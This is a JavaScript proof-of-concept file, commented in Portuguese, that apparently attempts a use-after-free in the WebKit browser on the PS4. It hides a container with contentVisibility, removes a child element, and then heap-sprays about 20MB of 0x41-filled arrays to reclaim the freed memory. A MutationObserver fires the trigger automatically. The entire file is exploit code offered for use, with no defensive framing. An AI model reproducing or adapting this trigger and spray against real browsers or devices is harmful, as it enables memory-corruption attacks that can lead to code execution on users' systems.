// js/uaf_webkit_poc/poc.js
import { debug_log } from './module/utils.mjs';

let uafCoreLogicHasRun = false; // Flag para controlar a execução da lógica principal

function heapSpray() {
  let spray = [];
  // Reduzir o spray para testes iniciais no PS4 se 80MB for muito
  // Talvez 2000 iterações (8MB) ou 5000 (20MB) seja mais gerenciável inicialmente.
  // Mantenha 10000 se você tem certeza que o alvo aguenta um spray maior.
  const sprayIterations = 5000; // Exemplo: Reduzido para 5000 (~20MB)
  debug_log(`Iniciando heapSpray com ${sprayIterations} iterações...`);

  for (let i = 0; i < sprayIterations; i++) {
    let arr = new Uint8Array(0x1000); // 4KB
    for (let j = 0; j < arr.length; j++) {
      arr[j] = 0x41; // Preenche com 'A'
    }
    spray.push(arr);
  }
  return spray;
}

export function triggerUAF() {
  const currentContainer = document.querySelector(".container");

  if (!currentContainer) {
    debug_log("Erro Crítico: Elemento .container não encontrado para UAF.");
    console.error("Erro Crítico: Elemento .container não encontrado para UAF.");
    return;
  }

  // A lógica principal do UAF (remoção e agendamento do spray) só roda uma vez.
  if (uafCoreLogicHasRun) {
    debug_log("Lógica principal do UAF já foi executada. Apenas alternando visibilidade e refazendo spray leve.");
    // Em chamadas subsequentes, podemos apenas repetir o toggle de visibilidade
    // e talvez um spray menor se a intenção for "cutucar" a área de memória.
    // Ou simplesmente não fazer nada. Por ora, vamos repetir o spray se chamado de novo.
    currentContainer.style.contentVisibility = "hidden";
    setTimeout(() => {
        if (document.body.contains(currentContainer)) {
            currentContainer.style.contentVisibility = "auto";
        }
        // let sprayArrays = heapSpray(); // Opcional: um spray menor aqui ou nenhum.
        // if(sprayArrays.length > 0) {
        //     debug_log(`(Re-spray) Heap spray realizado com ${sprayArrays.length} arrays.`);
        // }
        debug_log("(Re-tentativa) Tentativa de UAF concluída (visibilidade alternada).");
    }, 0);
    return;
  }

  const currentChild = currentContainer.querySelector(".child");

  debug_log("Iniciando tentativa de UAF: contentVisibility=hidden...");
  currentContainer.style.contentVisibility = "hidden";

  if (currentChild) {
    debug_log("Elemento .child encontrado, removendo-o.");
    currentChild.remove();
  } else {
    debug_log("Elemento .child já foi removido ou não encontrado inicialmente.");
  }

  uafCoreLogicHasRun = true; // Marca que a lógica principal foi acionada

  setTimeout(() => {
    debug_log("Continuando UAF: contentVisibility=auto, heapSpray()...");
    if (document.body.contains(currentContainer)) {
        currentContainer.style.contentVisibility = "auto";
    } else {
        debug_log("Container foi removido do DOM antes de contentVisibility='auto'.");
        // Se o container sumiu, não adianta prosseguir com o spray no contexto dele.
        return;
    }
    
    let sprayArrays = heapSpray(); // Heap spray principal
    if(sprayArrays.length > 0) {
        debug_log(`Heap spray realizado com ${sprayArrays.length} arrays.`);
    }
    debug_log("Tentativa de UAF (principal) concluída. Verifique o console e comportamento do navegador.");
  }, 0);
}

// Configuração do MutationObserver
const initialContainerForObserver = document.querySelector(".container");
if (initialContainerForObserver) {
    const observer = new MutationObserver((mutationsList, obs) => {
      // Aciona triggerUAF apenas se a lógica principal ainda não rodou
      if (!uafCoreLogicHasRun) { 
        debug_log("MutationObserver: DOM tree modified, chamando triggerUAF (primeira vez via observer)...");
        triggerUAF();
        // Não é mais necessário desconectar explicitamente aqui, pois a flag uafCoreLogicHasRun
        // impedirá que o observer cause múltiplas execuções da lógica principal.
        // No entanto, desconectar após a primeira ativação desejada ainda é uma boa prática se
        // o observer não for mais necessário ou para evitar processamento de mutações futuras.
        obs.disconnect(); 
        debug_log("MutationObserver desconectado para evitar loops excessivos.");
      } else {
        // Opcional: logar que o observer viu uma mutação mas a lógica principal já rodou.
        // debug_log("MutationObserver: viu mutação, mas lógica UAF principal já executada.");
        // Desconectar para não ficar observando desnecessariamente se já rodou.
        obs.disconnect();
      }
    });
    observer.observe(initialContainerForObserver, { childList: true, subtree: true });
} else {
    console.warn("Elemento .container inicial não encontrado para MutationObserver no UAF PoC.");
}
